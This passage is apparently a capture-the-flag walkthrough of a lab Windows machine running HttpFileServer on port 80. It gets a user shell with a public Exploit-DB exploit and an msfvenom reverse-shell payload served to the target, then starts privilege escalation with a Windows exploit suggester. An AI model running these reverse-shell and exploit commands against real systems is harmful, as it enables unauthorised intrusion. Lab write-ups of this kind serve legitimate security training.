From the above scan, we have only 1 open port and that's the port that runs the http service. This means our enumeration today will be focused on port 80



# Enumeration

Navigate to the webpage

This webpage is being hosted by ```HttpFileServer```. 

I think there's an exploit for this version of ```HttpFileServer```, well lets check

Well there isðŸ˜…. Lets exploit right away



# Exploitation

Well, I found this great exploit, you can download it [here](https://www.exploit-db.com/exploits/39161)



So, we'll set the ```LHOST``` to our tun0 ip, we'll also set the ```LPORT``` to the port we plan on listening on

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/de36cb6b-4ff8-4fc4-a752-ca27abd72924)

Save the script.

As per the instruction in the script, we were told to host a ```nc.exe``` file, well I generated the ```.exe``` file using msfvenom

command:```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.43 LPORT=443 -f exe -o nc.exe```

```

Ensure you have your netcat listener ready before running the script

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/35697632-7b3e-4ef6-a9f3-c6e3b673af51)

Running the script requires the target's ip and port

command:```python2 39161.py 10.129.58.117 80```

Alongside running this script, we'll host the ```nc.exe``` file

command:```python3 -m http.server 80```

Checking our netcat listener,

We didn't spawn a shellðŸ¥², running the script again

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0b69eaaf-5c0c-43dd-a51f-967ee0e70029)

Checking our netcat listener,

We got a user shellðŸ™‚. Lets go ahead and escalate our privileges.



# Privilege Escalation

Lets run the  windows exploit suggester, you can get it [here](https://github.com/bitsadmin/wesng)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4262d643-84bb-41aa-a462-f30ab610a048)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/715e4a57-6fb2-494f-b118-b4b68849886d)

First lets update the database,

command:```python3 wes.py --update```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/66d7d16f-b1f9-432d-a0f0-a6b7f4d49730)

Done.

Lets go back to the shell we got earlier and run the ```systeminfo``` command, save the output in a file say ```systeminfo.txt```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c735b9d0-4fbf-42bb-9a4b-f888eac61e3f)

Now, to run the script

command:```python3 wes.py path/to/systeminfo.txt -e```
